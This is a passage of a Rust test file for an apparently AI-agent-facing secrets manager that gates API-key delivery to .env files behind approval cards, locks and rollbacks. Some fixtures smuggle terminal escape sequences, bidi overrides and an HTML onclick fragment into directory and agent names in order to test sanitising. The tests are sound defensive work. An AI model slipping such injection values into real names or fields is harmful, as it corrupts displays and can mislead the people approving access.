    assert_ne!(envfile::parse_line(text.lines().next().unwrap()).unwrap().1, other, "the other project's key never reached this file");
    std::env::set_var("TOKENSTASH_HOME", base_home()); std::env::remove_var("TOKENSTASH_STASH");
}

/// `cp .env.example .env.local` leaves `JWT_SECRET=changeme`; that is not a key to keep.
#[test]
fn a_placeholder_in_the_env_file_is_not_adopted() {
    let _g = env_lock();
    let (home, proj) = v2_world("gen-placeholder");
    let cfg = Config::default();
    let db = Db::open(&home.join("t.db")).unwrap();
    let stash = stash::open(&cfg).unwrap();
    let ctx = tasks::Ctx { cfg: &cfg, db: &db, stash: stash.as_ref(), probe: tasks::Probe::Off };
    std::fs::write(proj.join(".env.local"), "JWT_SECRET=changeme\n").unwrap();
    let out = need::need(&ctx, &proj, "agent", &["JWT_SECRET".to_string()], &Default::default()).unwrap();
    assert!(matches!(&out[0], need::Outcome::Injected { generated: true, .. }), "{:?}", out[0]);
    let text = std::fs::read_to_string(proj.join(".env.local")).unwrap();
    let (_, v) = envfile::parse_line(text.lines().next().unwrap()).unwrap();
    assert_ne!(v, "changeme");
    assert!(v.len() >= 32);
    std::env::set_var("TOKENSTASH_HOME", base_home()); std::env::remove_var("TOKENSTASH_STASH");
}

/// A `run` card for a generatable name is approved before anything is generated. Approving it
/// must keep the value the env file already holds, exactly as `need` does.
#[test]
fn approving_a_once_card_keeps_the_env_files_value() {
    let _g = env_lock();
    let (home, proj) = v2_world("gen-once-adopt");
    let cfg = Config::default();
    let db = Db::open(&home.join("t.db")).unwrap();
    let stash = stash::open(&cfg).unwrap();
    let ctx = tasks::Ctx { cfg: &cfg, db: &db, stash: stash.as_ref(), probe: tasks::Probe::Off };
    let live = "the-value-every-session-is-signed-with-0123456789";
    std::fs::write(proj.join(".env.local"), format!("AUTH_SECRET={live}\n")).unwrap();
    let opts = need::NeedOpts { require_approval: true, ..Default::default() };
    let out = need::need(&ctx, &proj, "prog", &["AUTH_SECRET".to_string()], &opts).unwrap();
    let tid = match &out[0] { need::Outcome::Pending { task_id, .. } => task_id.clone(), o => panic!("{o:?}") };
    let card = db.get_task(&tid).unwrap().unwrap();
    tasks::answer_approval(&ctx, &card, tasks::Decision::Allow, Some(&card.names)).unwrap();
    let text = std::fs::read_to_string(proj.join(".env.local")).unwrap();
    assert_eq!(envfile::parse_line(text.lines().next().unwrap()).unwrap().1, live, "approval adopted, not overwrote");
    std::env::set_var("TOKENSTASH_HOME", base_home()); std::env::remove_var("TOKENSTASH_STASH");
}

/// "No" to a pairing card for a key is a no for that key here — a broad grant given later
/// (allow-broad on some other card) must not turn into a silent delivery of it.
#[test]
fn a_denied_pairing_card_blocks_a_later_broad_delivery_of_that_key() {
    let _g = env_lock();
    let (home, proj) = v2_world("deny-then-broad");
    let cfg = Config::default();
    let db = Db::open(&home.join("t.db")).unwrap();
    let stash = stash::open(&cfg).unwrap();
    let ctx = tasks::Ctx { cfg: &cfg, db: &db, stash: stash.as_ref(), probe: tasks::Probe::Off };
    stash.set(&stash::stash_key("GROQ_API_KEY", "default"), &SecretString::from("gsk_bbbbbbbbbbbbbbbbbbbb".to_string())).unwrap();
    let out = need::need(&ctx, &proj, "agent", &["GROQ_API_KEY".to_string()], &Default::default()).unwrap();
    let tid = match &out[0] { need::Outcome::Pending { task_id, .. } => task_id.clone(), o => panic!("{o:?}") };
    let card = db.get_task(&tid).unwrap().unwrap();
    assert_eq!(card.kind, db::TaskKind::Approval);
    tasks::deny(&ctx, &card, None).unwrap();
    let ws = db.workspace_for(&proj).unwrap();
    db.grant(&ws.id, "*", "default", db::GRANT_BROAD, db::GRANT_PAIRING).unwrap();
    let out = need::need(&ctx, &proj, "agent", &["GROQ_API_KEY".to_string()], &Default::default()).unwrap();
    assert!(matches!(&out[0], need::Outcome::Denied { .. }), "the broad grant does not overrule the denial: {:?}", out[0]);
    assert!(!proj.join(".env.local").exists());
    std::env::set_var("TOKENSTASH_HOME", base_home()); std::env::remove_var("TOKENSTASH_STASH");
}

/// A FIFO at the env path is one `mkfifo` away for an agent; `has` runs on every request.
#[test]
fn has_does_not_hang_on_a_fifo() {
    let dir = tmp("fifo-has");
    assert!(std::process::Command::new("mkfifo").arg(dir.join(".env.local")).status().unwrap().success());
    let done = std::sync::Arc::new(std::sync::atomic::AtomicBool::new(false));
    let d2 = done.clone(); let dir2 = dir.clone();
    std::thread::spawn(move || { let _ = envfile::has(&dir2, ".env.local", "A"); d2.store(true, std::sync::atomic::Ordering::SeqCst); });
    let start = std::time::Instant::now();
    while !done.load(std::sync::atomic::Ordering::SeqCst) {
        assert!(start.elapsed() < std::time::Duration::from_secs(5), "has() blocked on the FIFO");
        std::thread::sleep(std::time::Duration::from_millis(20));
    }
    assert!(envfile::read_regular_file(&dir.join(".env.local")).is_none());
}

/// The directory name is the agent's: control and bidi characters in it must not reach the
/// card title, which `tokenstash tasks` prints raw.
#[test]
fn an_approval_card_title_is_cleaned_of_the_directory_names_control_characters() {
    let _g = env_lock();
    let home = tmp("card-title-home");
    std::env::set_var("TOKENSTASH_HOME", &home);
    let proj = tmp("evil\u{202e}\u{1b}[31mdir").canonicalize().unwrap();
    let cfg = Config::default();
    let db = Db::open(&home.join("t.db")).unwrap();
    let st = stash::FileStash::new().unwrap();
    let ctx = tasks::Ctx { cfg: &cfg, db: &db, stash: &st, probe: tasks::Probe::Off };
    let t = tasks::create_approval_task(&ctx, &proj, "agent", &["OPENAI_API_KEY@default".to_string()], tasks::ApprovalKind::Pairing).unwrap();
    assert!(!t.title.contains('\u{202e}') && !t.title.contains('\u{1b}'), "{:?}", t.title);
    assert!(t.title.contains("dir") && t.title.contains("wants"), "{:?}", t.title);
    std::env::set_var("TOKENSTASH_HOME", base_home());
}

/// A paste that other directories will receive — a Replace card, or a key they hold a grant
/// for — is a decision about them; the agent's own link must not make it.
#[test]
fn fans_out_when_another_directory_holds_a_grant_or_the_card_is_a_replacement() {
    let _g = env_lock();
    let (home, proj_a) = v2_world("fanout-a");
    let proj_b = tmp("fanout-b").canonicalize().unwrap();
    let cfg = Config::default();
    let db = Db::open(&home.join("t.db")).unwrap();
    let stash = stash::open(&cfg).unwrap();
    let ctx = tasks::Ctx { cfg: &cfg, db: &db, stash: stash.as_ref(), probe: tasks::Probe::Off };
    pair(&db, &proj_a, "OPENAI_API_KEY");
    let req = tasks::SecretRequest::default();
    let held_elsewhere = tasks::create_secret_task(&ctx, &proj_b, "agent", "OPENAI_API_KEY", "default", &req).unwrap();
    assert!(tasks::fans_out(&ctx, &held_elsewhere).unwrap(), "A holds a grant for it");
    let fresh = tasks::create_secret_task(&ctx, &proj_b, "agent", "RESEND_API_KEY", "default", &req).unwrap();
    assert!(!tasks::fans_out(&ctx, &fresh).unwrap(), "nobody else holds it");
    // A's own grant for the key does not count: the card is A's, and A already holds it.
    pair(&db, &proj_a, "GROQ_API_KEY");
    let own = tasks::create_secret_task(&ctx, &proj_a, "agent", "GROQ_API_KEY", "default", &req).unwrap();
    assert!(!tasks::fans_out(&ctx, &own).unwrap(), "the card's own directory is not \"elsewhere\"");
    let replace = tasks::create_replacement_task(&ctx, &proj_b, "agent", "RESEND_API_KEY", "default", &req).unwrap();
    assert!(tasks::fans_out(&ctx, &replace).unwrap(), "a replacement rewrites every holder");
    std::env::set_var("TOKENSTASH_HOME", base_home()); std::env::remove_var("TOKENSTASH_STASH");
}

/// A broad grant in another directory delivers a registry key there on its next `need`, so a
/// paste of that key elsewhere reaches it too. `forget` keeps grants, so the re-paste is
/// the same decision. Sensitive and unregistered names are never covered by a broad grant.
#[test]
fn fans_out_through_a_broad_grant_elsewhere_and_after_forget() {
    let _g = env_lock();
    let (home, proj_a) = v2_world("fanout-broad-a");
    let proj_b = tmp("fanout-broad-b").canonicalize().unwrap();
    let cfg = Config::default();
    let db = Db::open(&home.join("t.db")).unwrap();
    let stash = stash::open(&cfg).unwrap();
    let ctx = tasks::Ctx { cfg: &cfg, db: &db, stash: stash.as_ref(), probe: tasks::Probe::Off };
    // A holds only a broad grant: no exact grant for any of the names below.
    let ws_a = db.workspace_for(&proj_a).unwrap();
    db.grant(&ws_a.id, "*", "default", db::GRANT_BROAD, db::GRANT_PAIRING).unwrap();
    let req = tasks::SecretRequest::default();
    let registry_key = tasks::create_secret_task(&ctx, &proj_b, "agent", "GROQ_API_KEY", "default", &req).unwrap();
    assert!(tasks::fans_out(&ctx, &registry_key).unwrap(), "A's broad grant would deliver GROQ_API_KEY there");
    let sensitive = tasks::create_secret_task(&ctx, &proj_b, "agent", "TWILIO_AUTH_TOKEN", "default", &req).unwrap();
    assert!(!tasks::fans_out(&ctx, &sensitive).unwrap(), "a broad grant never covers a name the registry tags sensitive");
    // Sensitive by value pattern only (Stripe live vs test): the value is not known when this
    // is judged, so the name counts as one a broad grant could deliver — the strict side.
    let by_pattern = tasks::create_secret_task(&ctx, &proj_b, "agent", "STRIPE_SECRET_KEY", "default", &req).unwrap();
    assert!(tasks::fans_out(&ctx, &by_pattern).unwrap(), "a pattern-sensitive name is judged before the value exists");
    let unregistered = tasks::create_secret_task(&ctx, &proj_b, "agent", "MY_INTERNAL_TOKEN", "default", &req).unwrap();
    assert!(!tasks::fans_out(&ctx, &unregistered).unwrap(), "a broad grant never covers an unregistered name");
    let other_identity = tasks::create_secret_task(&ctx, &proj_b, "agent", "RESEND_API_KEY", "work", &req).unwrap();
    assert!(!tasks::fans_out(&ctx, &other_identity).unwrap(), "a broad grant is per identity");
    // A's own broad grant does not make A's own card fan out.
    let own = tasks::create_secret_task(&ctx, &proj_a, "agent", "RESEND_API_KEY", "default", &req).unwrap();
    assert!(!tasks::fans_out(&ctx, &own).unwrap());
    // Exact grant, value stored, then forgotten: the grant stays, so the next paste fans out.
    pair(&db, &proj_a, "OPENAI_API_KEY");
    let first = tasks::create_secret_task(&ctx, &proj_a, "agent", "OPENAI_API_KEY", "default", &req).unwrap();
    tasks::answer_secret(&ctx, &first, SecretString::from("sk-firstfirstfirst1234".to_string()), true).unwrap();
    stash.delete(&stash::stash_key("OPENAI_API_KEY", "default")).unwrap();
    db.delete_secret("OPENAI_API_KEY", "default").unwrap();
    let repaste = tasks::create_secret_task(&ctx, &proj_b, "agent", "OPENAI_API_KEY", "default", &req).unwrap();
    assert!(tasks::fans_out(&ctx, &repaste).unwrap(), "after forget, A's grant still delivers the next value");
    std::env::set_var("TOKENSTASH_HOME", base_home()); std::env::remove_var("TOKENSTASH_STASH");
}

/// Provider validation runs before the write transaction. If that interval promotes an
/// ordinary card to a replacement, both a full-session human and the requester must reload:
/// silently accepting either answer would apply semantics they did not originally see.
#[test]
fn a_card_promoted_during_validation_requires_both_actors_to_reload() {
    let root = tmp("expects-race");
    let db_path = root.join("index.db");
    let db = Db::open(&db_path).unwrap();
    let other = Db::open(&db_path).unwrap();
    let project = root.join("project");
    std::fs::create_dir_all(&project).unwrap();
    let project = project.canonicalize().unwrap();
    let ws = db.workspace_for(&project).unwrap();
    let cfg = Config::default();
    let stash = HookStash::new(|| -> anyhow::Result<()> { Ok(()) }, false);
    let setup = tasks::Ctx { cfg: &cfg, db: &db, stash: &stash, probe: tasks::Probe::Off };

    for (actor, identity) in [(tasks::Actor::Human, "human"), (tasks::Actor::Requester, "requester")] {
        let card = tasks::create_secret_task(&setup, &project, "agent", "OPENAI_API_KEY", identity, &Default::default()).unwrap();
        assert_ne!(card.expects, tasks::EXPECTS_REPLACE);
        let promote = |_: &registry::Check| {
            other.set_task_expects(&card.id, tasks::EXPECTS_REPLACE).unwrap();
            validate::Liveness::Ok
        };
        let racing = tasks::Ctx { cfg: &cfg, db: &db, stash: &stash, probe: tasks::Probe::Stub(&promote) };
        let err = tasks::answer_secret_by(&racing, actor, &card, SecretString::from("sk-raced-raced-raced-1234".to_string()), false).unwrap_err().to_string();
        assert!(err.contains("card changed") && err.contains("reload"), "{actor:?}: {err}");
        let fresh = db.get_task(&card.id).unwrap().unwrap();
        assert_eq!(fresh.expects, tasks::EXPECTS_REPLACE);
        assert_eq!(fresh.status, db::TaskStatus::Pending, "{actor:?} must not claim the changed task");
        assert!(stash.get(&stash::stash_key("OPENAI_API_KEY", identity)).unwrap().is_none(), "{actor:?} must not touch the stash");
        assert!(db.get_secret("OPENAI_API_KEY", identity).unwrap().is_none(), "{actor:?} must not write metadata");
        assert!(db.grant_source(&ws.id, "OPENAI_API_KEY", identity).unwrap().is_none(), "{actor:?} must not grant");
        assert!(db.conn.is_autocommit(), "{actor:?} must release the transaction");
    }
    assert!(!project.join(".env.local").exists(), "neither changed card delivers to the env file");
}

/// The index writer lock begins before `stash.set`: a competing process cannot add a grant
/// or deny a sibling card in that callback. Success and stash failure both release the lock;
/// the failure also rolls the claimed task back to pending.
#[test]
fn the_store_holds_one_writer_lock_through_stash_set_and_releases_it() {
    let _g = env_lock();
    for fail_set in [false, true] {
        let tag = if fail_set { "failure" } else { "success" };
        let root = tmp(&format!("store-lock-{tag}"));
        let db_path = root.join("index.db");
        let db = Db::open(&db_path).unwrap();
        let other = Db::open(&db_path).unwrap();
        other.conn.busy_timeout(std::time::Duration::from_millis(10)).unwrap();
        let project = root.join("project");
        let recipient = root.join("recipient");
        std::fs::create_dir_all(&project).unwrap();
        std::fs::create_dir_all(&recipient).unwrap();
        let project = project.canonicalize().unwrap();
        let recipient = recipient.canonicalize().unwrap();
        let recipient_ws = db.workspace_for(&recipient).unwrap();
        let cfg = Config::default();
        let setup_stash = HookStash::new(|| -> anyhow::Result<()> { Ok(()) }, false);
        let setup = tasks::Ctx { cfg: &cfg, db: &db, stash: &setup_stash, probe: tasks::Probe::Off };
        let card = tasks::create_secret_task(&setup, &project, "agent", "LOCKED_STORE_KEY", "default", &Default::default()).unwrap();
        let sibling = tasks::create_secret_task(&setup, &project, "agent", "LOCKED_DENIAL_KEY", "default", &Default::default()).unwrap();
        let grant_attempt = std::cell::RefCell::new(None::<String>);
        let denial_attempt = std::cell::RefCell::new(None::<String>);
        let hook = || -> anyhow::Result<()> {
            let grant = other.grant(&recipient_ws.id, "LOCKED_STORE_KEY", "default", db::GRANT_KEY, db::GRANT_PAIRING);
            *grant_attempt.borrow_mut() = Some(match grant { Ok(()) => "succeeded".into(), Err(e) => format!("{e:#}") });
            let denial = other.close_task_if_open(&sibling.id, db::TaskStatus::Denied, None);
            *denial_attempt.borrow_mut() = Some(match denial { Ok(v) => format!("succeeded:{v}"), Err(e) => format!("{e:#}") });
            Ok(())
        };
        let stash = HookStash::new(hook, fail_set);
        let ctx = tasks::Ctx { cfg: &cfg, db: &db, stash: &stash, probe: tasks::Probe::Off };
        let result = tasks::answer_secret_by(&ctx, tasks::Actor::Human, &card, SecretString::from("locked-store-value-1234".to_string()), true);

        assert!(grant_attempt.borrow().as_deref().is_some_and(|e| e.contains("locked")), "competing grant was not blocked: {:?}", *grant_attempt.borrow());
        assert!(denial_attempt.borrow().as_deref().is_some_and(|e| e.contains("locked")), "competing denial was not blocked: {:?}", *denial_attempt.borrow());
        assert!(db.conn.is_autocommit(), "{tag}: store must restore autocommit");
        let stored = stash.get(&stash::stash_key("LOCKED_STORE_KEY", "default")).unwrap();
        let status = db.get_task(&card.id).unwrap().unwrap().status;
        if fail_set {
            assert!(format!("{:#}", result.unwrap_err()).contains("injected stash failure"));
            assert!(stored.is_none(), "a rejected stash write has no side effect");
            assert_eq!(status, db::TaskStatus::Pending, "the failed store rolls back its claim");
            assert!(!project.join(".env.local").exists());
        } else {
            result.unwrap();
            assert!(stored.is_some());
            assert_eq!(status, db::TaskStatus::Answered);
            assert!(project.join(".env.local").exists());
        }

        // Both writes failed only because the first connection held its transaction. Once
        // the operation returns — success or error — this connection can write immediately.
        other.grant(&recipient_ws.id, "LOCKED_STORE_KEY", "default", db::GRANT_KEY, db::GRANT_PAIRING).unwrap();
        assert!(other.close_task_if_open(&sibling.id, db::TaskStatus::Denied, None).unwrap());
    }
}

/// A metadata statement can fail after the stash accepted the value. SQLite state rolls
/// back and returns to autocommit; the external stash side effect remains and no env file is
/// delivered because injection starts only after a successful commit.
#[test]
fn metadata_failure_rolls_back_the_task_and_index_but_not_the_stash() {
    let root = tmp("store-metadata-failure");
    let db_path = root.join("index.db");
    let db = Db::open(&db_path).unwrap();
    let other = Db::open(&db_path).unwrap();
    let project = root.join("project");
    std::fs::create_dir_all(&project).unwrap();
    let project = project.canonicalize().unwrap();
    let ws = db.workspace_for(&project).unwrap();
    let cfg = Config::default();
    let stash = HookStash::new(|| -> anyhow::Result<()> { Ok(()) }, false);
    let ctx = tasks::Ctx { cfg: &cfg, db: &db, stash: &stash, probe: tasks::Probe::Off };
    let card = tasks::create_secret_task(&ctx, &project, "agent", "METADATA_FAILURE_KEY", "default", &Default::default()).unwrap();
    db.conn.execute_batch(
        "CREATE TRIGGER inject_metadata_failure BEFORE INSERT ON audit
         WHEN NEW.action = 'store'
         BEGIN SELECT RAISE(ABORT, 'injected metadata failure'); END;"
    ).unwrap();

    let err = tasks::answer_secret_by(&ctx, tasks::Actor::Human, &card, SecretString::from("metadata-failure-value-1234".to_string()), true).unwrap_err();
    assert!(format!("{err:#}").contains("injected metadata failure"), "{err:#}");
    assert!(db.conn.is_autocommit());
    assert_eq!(db.get_task(&card.id).unwrap().unwrap().status, db::TaskStatus::Pending);
    assert!(db.get_secret("METADATA_FAILURE_KEY", "default").unwrap().is_none());
    assert!(db.grant_source(&ws.id, "METADATA_FAILURE_KEY", "default").unwrap().is_none());
    assert!(stash.get(&stash::stash_key("METADATA_FAILURE_KEY", "default")).unwrap().is_some(), "the accepted external stash write cannot be rolled back");
    assert!(!project.join(".env.local").exists());
    other.audit(None, None, "metadata.failure.lock.released", None, None, None).unwrap();
}

/// Deferred constraints fail at COMMIT after every metadata statement, including the grant,
/// succeeded. That failed COMMIT must be followed by ROLLBACK or the task remains answered
/// and the connection keeps its writer lock indefinitely.
#[test]
fn commit_failure_rolls_back_task_and_grant_and_restores_autocommit() {
    let root = tmp("store-commit-failure");
    let db_path = root.join("index.db");
    let db = Db::open(&db_path).unwrap();
    let other = Db::open(&db_path).unwrap();
    let project = root.join("project");
    std::fs::create_dir_all(&project).unwrap();
    let project = project.canonicalize().unwrap();
    let ws = db.workspace_for(&project).unwrap();
    let cfg = Config::default();
    let stash = HookStash::new(|| -> anyhow::Result<()> { Ok(()) }, false);
    let ctx = tasks::Ctx { cfg: &cfg, db: &db, stash: &stash, probe: tasks::Probe::Off };
    let card = tasks::create_secret_task(&ctx, &project, "agent", "COMMIT_FAILURE_KEY", "default", &Default::default()).unwrap();
    db.conn.execute_batch(
        "PRAGMA foreign_keys=ON;
         CREATE TABLE deferred_commit_failure (
             id INTEGER PRIMARY KEY,
             workspace_id TEXT NOT NULL REFERENCES workspaces(id) DEFERRABLE INITIALLY DEFERRED
         );
         CREATE TRIGGER inject_commit_failure AFTER INSERT ON secrets
         BEGIN INSERT INTO deferred_commit_failure (workspace_id) VALUES ('missing-workspace'); END;"
    ).unwrap();

    let err = tasks::answer_secret_by(&ctx, tasks::Actor::Human, &card, SecretString::from("commit-failure-value-1234".to_string()), true).unwrap_err();
    assert!(format!("{err:#}").contains("recording the stored secret"), "{err:#}");
    assert!(db.conn.is_autocommit(), "failed COMMIT must be followed by ROLLBACK");
    assert_eq!(db.get_task(&card.id).unwrap().unwrap().status, db::TaskStatus::Pending, "task claim rolled back");
    assert!(db.get_secret("COMMIT_FAILURE_KEY", "default").unwrap().is_none(), "secret metadata rolled back");
    assert!(db.grant_source(&ws.id, "COMMIT_FAILURE_KEY", "default").unwrap().is_none(), "grant written before COMMIT rolled back");
    let deferred_rows: i64 = db.conn.query_row("SELECT COUNT(*) FROM deferred_commit_failure", [], |r| r.get(0)).unwrap();
    assert_eq!(deferred_rows, 0, "the deferred violation itself rolled back");
    assert!(stash.get(&stash::stash_key("COMMIT_FAILURE_KEY", "default")).unwrap().is_some(), "SQLite cannot roll back an accepted stash write");
    assert!(!project.join(".env.local").exists(), "delivery starts only after COMMIT");
    other.audit(None, None, "commit.failure.lock.released", None, None, None).unwrap();
}

/// The requester's paste is refused at the operation, with nothing stored, nothing written
/// and the card still open — whichever surface forgot to hide the button. The refusal is
/// decided under the index write lock on the grants as they are then, so a grant given in
/// another directory while the slow provider check ran is seen. A paste the shape or the
/// provider refuses leaves the card and the stash as they were.
#[test]
fn a_requester_cannot_make_a_paste_that_fans_out() {
    let _g = env_lock();
    let (home, proj_a) = v2_world("requester-a");
    let proj_b = tmp("requester-b").canonicalize().unwrap();
    let cfg = Config::default();
    let db = Db::open(&home.join("t.db")).unwrap();
    let stash = stash::open(&cfg).unwrap();
    let ctx = tasks::Ctx { cfg: &cfg, db: &db, stash: stash.as_ref(), probe: tasks::Probe::Off };
    pair(&db, &proj_a, "OPENAI_API_KEY");
    let req = tasks::SecretRequest::default();
    let card = tasks::create_secret_task(&ctx, &proj_b, "agent", "OPENAI_API_KEY", "default", &req).unwrap();
    let value = SecretString::from("sk-attacker-chosen-value-1234".to_string());
    let e = tasks::answer_secret_by(&ctx, tasks::Actor::Requester, &card, value.clone(), true).unwrap_err().to_string();
    assert!(e.contains("other directories hold this key"), "{e}");
    assert!(stash.get(&stash::stash_key("OPENAI_API_KEY", "default")).unwrap().is_none(), "nothing stored");
    assert!(!proj_b.join(".env.local").exists(), "nothing written");
    assert_eq!(db.get_task(&card.id).unwrap().unwrap().status, db::TaskStatus::Pending, "the card stays open for a person");
    assert!(db.conn.is_autocommit(), "the lock is released on refusal");
    // A card that reaches nobody else is the requester's to answer.
    let own = tasks::create_secret_task(&ctx, &proj_b, "agent", "RESEND_API_KEY", "default", &req).unwrap();
    tasks::answer_secret_by(&ctx, tasks::Actor::Requester, &own, SecretString::from("re_ownownownown1234".to_string()), true).unwrap();
    assert!(proj_b.join(".env.local").exists());
    // The concurrent case: when the requester's paste started, nobody else held
    // GROQ_API_KEY; while the provider check ran, a person paired directory C with it. The
    // gate re-reads the grants under the lock after the probe, so the paste is refused.
    let proj_c = tmp("requester-c").canonicalize().unwrap();
    let during_probe = Db::open(&home.join("t.db")).unwrap();
    let ws_c = during_probe.workspace_for(&proj_c).unwrap();
    let groq = tasks::create_secret_task(&ctx, &proj_b, "agent", "GROQ_API_KEY", "default", &req).unwrap();
    assert!(!tasks::fans_out(&ctx, &groq).unwrap(), "nobody holds it yet");
    let grant_during_probe = |_: &registry::Check| {
        during_probe.grant(&ws_c.id, "GROQ_API_KEY", "default", db::GRANT_KEY, db::GRANT_PAIRING).unwrap();
        validate::Liveness::Ok
    };
    let racing = tasks::Ctx { cfg: &cfg, db: &db, stash: stash.as_ref(), probe: tasks::Probe::Stub(&grant_during_probe) };
    let e = tasks::answer_secret_by(&racing, tasks::Actor::Requester, &groq, SecretString::from("gsk_racedracedraced1234".to_string()), false).unwrap_err().to_string();
    assert!(e.contains("other directories hold this key"), "a grant given during the probe is seen: {e}");
    assert!(stash.get(&stash::stash_key("GROQ_API_KEY", "default")).unwrap().is_none(), "nothing stored");
    assert_eq!(db.get_task(&groq.id).unwrap().unwrap().status, db::TaskStatus::Pending);
    // Failed validation, either kind, changes nothing: the card is open, the stash empty.
    let e = tasks::answer_secret_by(&ctx, tasks::Actor::Requester, &groq, SecretString::from("not-a-groq-key-shape-at-all".to_string()), true).unwrap_err().to_string();
    assert!(e.contains("does not match the expected pattern"), "{e}");
    let rejecting = |_: &registry::Check| validate::Liveness::Rejected(401);
    let rejected = tasks::Ctx { cfg: &cfg, db: &db, stash: stash.as_ref(), probe: tasks::Probe::Stub(&rejecting) };
    let e = tasks::answer_secret_by(&rejected, tasks::Actor::Human, &groq, SecretString::from("gsk_rejectedrejected1234".to_string()), false).unwrap_err().to_string();
    assert!(e.contains("rejected this key"), "{e}");
    assert!(stash.get(&stash::stash_key("GROQ_API_KEY", "default")).unwrap().is_none(), "nothing stored after a refused validation");
    assert_eq!(db.get_task(&groq.id).unwrap().unwrap().status, db::TaskStatus::Pending);
    assert!(db.conn.is_autocommit());
    // A person answers the fanning-out card.
    tasks::answer_secret_by(&ctx, tasks::Actor::Human, &card, value, true).unwrap();
    assert!(stash.get(&stash::stash_key("OPENAI_API_KEY", "default")).unwrap().is_some());
    // ...and once it is answered, a second answer is told so and stores nothing over it.
    // (The caller still holds the card as it read it, pending; the lock sees the truth.)
    let e = tasks::answer_secret_by(&ctx, tasks::Actor::Human, &card, SecretString::from("sk-second-answer-value-1234".to_string()), true).unwrap_err().to_string();
    assert!(e.contains("answered somewhere else"), "{e}");
    assert_eq!(secrecy::ExposeSecret::expose_secret(&stash.get(&stash::stash_key("OPENAI_API_KEY", "default")).unwrap().unwrap()), "sk-attacker-chosen-value-1234", "the first answer stands");
    std::env::set_var("TOKENSTASH_HOME", base_home()); std::env::remove_var("TOKENSTASH_STASH");
}

/// `TOKENSTASH_AGENT` reaches cards, notifications and the terminal; it is filtered where it
/// is read, so `run` and `report-bad` cannot take it raw by forgetting to.
#[test]
fn detect_agent_filters_the_environment_value() {
    let _g = env_lock();
    std::env::set_var("TOKENSTASH_AGENT", "my\u{202e}<b onclick=x>agent\u{1b}[31m");
    let a = project::detect_agent();
    std::env::remove_var("TOKENSTASH_AGENT");
    assert!(!a.contains('\u{202e}') && !a.contains('<') && !a.contains('\u{1b}'), "{a:?}");
    assert!(a.contains("agent"));
}

/// The OS keyring is per user; every grant is per home. A home the caller invents must not
/// find the real keys in it. The default home keeps the plain name so nothing migrates.
#[test]
fn the_keyring_service_is_namespaced_by_a_non_default_home() {
    let _g = env_lock();
    let home = tmp("svc-home");
    std::env::set_var("TOKENSTASH_HOME", &home);
    let s = stash::service();
    assert!(s.starts_with("tokenstash-") && s != "tokenstash", "{s}");
    let again = stash::service();
    assert_eq!(s, again, "stable for the same home");
    std::env::set_var("TOKENSTASH_HOME", base_home());
    assert_ne!(stash::service(), s, "a different home is a different stash");
    // The default home keeps the plain name — the half that protects every existing user's
    // keys. `default_config_dir` is pure, so this is safe to assert without touching it.
    std::env::remove_var("TOKENSTASH_HOME");
    assert_eq!(stash::service(), "tokenstash");
    let spelled_via_dotdot = config::default_config_dir().join("..").join("tokenstash");
    std::env::set_var("TOKENSTASH_HOME", &spelled_via_dotdot);
    assert_eq!(stash::service(), "tokenstash", "the same directory spelled with `..` is the same stash");
    std::env::set_var("TOKENSTASH_HOME", base_home());
}

/// One notion of "this line defines NAME" for readers and the writer: an indented line used
/// to be invisible to `has` and to `upsert`, which then appended a second definition.
#[test]
fn an_indented_definition_is_seen_and_replaced_not_duplicated() {
    let dir = tmp("indented");
    std::fs::write(dir.join(".env.local"), "  A_KEY=old\nB=1\n").unwrap();
    assert!(envfile::has(&dir, ".env.local", "A_KEY"));
    envfile::write(&dir, ".env.local", "A_KEY", &SecretString::from("new-value".to_string())).unwrap();
    let text = std::fs::read_to_string(dir.join(".env.local")).unwrap();
    assert_eq!(text.lines().filter(|l| envfile::parse_line(l).map(|(k, _)| k == "A_KEY").unwrap_or(false)).count(), 1, "{text}");
    assert!(text.contains("A_KEY=new-value") && text.contains("B=1"), "{text}");
}

/// A `query:` probe used to append the value raw; `&` or `#` in a key sent it truncated.
#[test]
fn a_query_auth_value_is_percent_encoded() {
    assert_eq!(validate::percent_encode("a&b#c d~z"), "a%26b%23c%20d~z");
    assert_eq!(validate::percent_encode("AQ.plain-Key_0"), "AQ.plain-Key_0");
    assert_eq!(validate::percent_encode("/? ключ"), "%2F%3F%20%D0%BA%D0%BB%D1%8E%D1%87");
}

/// A deny note goes back to the agent as the reason; a credential must not ride along.
#[test]
fn a_deny_note_that_looks_like_a_secret_is_refused() {
    let _g = env_lock();
    let (home, proj) = v2_world("deny-note");
    let cfg = Config::default();
    let db = Db::open(&home.join("t.db")).unwrap();
    let stash = stash::open(&cfg).unwrap();
    let ctx = tasks::Ctx { cfg: &cfg, db: &db, stash: stash.as_ref(), probe: tasks::Probe::Off };
    let t = tasks::create_secret_task(&ctx, &proj, "agent", "OPENAI_API_KEY", "default", &Default::default()).unwrap();
    assert!(tasks::deny(&ctx, &t, Some("sk-abcdefghijklmnopqrstuvwxyz012345")).is_err());
    assert_eq!(db.get_task(&t.id).unwrap().unwrap().status, db::TaskStatus::Pending, "a refused note must not close the card");
    tasks::deny(&ctx, &t, Some("we use a different provider")).unwrap();
    std::env::set_var("TOKENSTASH_HOME", base_home()); std::env::remove_var("TOKENSTASH_STASH");
}

/// One toast per card: the claim is a compare-and-set, so two processes polling the same
/// card cannot both win it.
#[test]
fn a_card_is_notified_once() {
    let home = tmp("notify-once");
    let db = Db::open(&home.join("t.db")).unwrap();
    let cfg = Config::default();
    let st = stash::FileStash::new().unwrap();
    let ctx = tasks::Ctx { cfg: &cfg, db: &db, stash: &st, probe: tasks::Probe::Off };
    let t = tasks::create_secret_task(&ctx, &home, "agent", "OPENAI_API_KEY", "default", &Default::default()).unwrap();
    assert!(db.mark_notified(&t.id).unwrap());
    assert!(!db.mark_notified(&t.id).unwrap());
    assert!(!db.mark_notified(&t.id).unwrap());
    assert!(!db.mark_notified("t_nothere").unwrap(), "an unknown card is not a fresh one");
}

/// The `query:` probe puts the value in the URL; it must arrive encoded, not truncated at `&`.
#[test]
fn a_query_probe_sends_the_value_percent_encoded() {
    let v = SecretString::from("AQ.key&with#specials".to_string());
    let (url, rx, _h) = loopback("HTTP/1.1 200 OK\r\nContent-Length: 2\r\nConnection: close\r\n\r\n{}");
    assert_eq!(validate::liveness(&check_for(&url, "query:key"), &v, std::time::Duration::from_secs(1)), validate::Liveness::Ok);
    let req = rx.recv().unwrap();
    assert!(req.contains("/probe?key=AQ.key%26with%23specials "), "{req}");
}

/// Transport errors include their URL in ureq's Display output. For query authentication
/// that URL contains the credential percent-encoded, which raw-value redaction does not see.
#[test]
